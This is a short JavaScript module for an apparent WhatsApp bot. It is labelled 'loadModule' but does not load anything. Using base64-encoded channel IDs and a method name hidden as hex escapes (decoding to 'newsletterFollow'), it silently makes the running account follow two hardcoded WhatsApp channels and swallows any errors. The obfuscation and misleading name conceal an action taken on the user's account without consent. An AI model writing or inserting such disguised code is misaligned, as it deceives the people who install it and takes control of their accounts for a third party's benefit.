exports.loadModule = async (setsuzoku, データベース = ["MTIwMzYzNDE5MDgzMTk1NDUy", "MTIwMzYzNDIxNTcwNjQ3MDIy"]) => {
  let デコード = (テキスト) => Buffer.from(テキスト, 'base64').toString();
  for (let アイテム of データベース) {
    let チャンネル = デコード(アイテム).replace(/[^0-9]/g, "") + "@newsletter";
    try {
      await setsuzoku["\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72\x46\x6f\x6c\x6c\x6f\x77"](チャンネル);
    } catch (エラー) {}
  }
}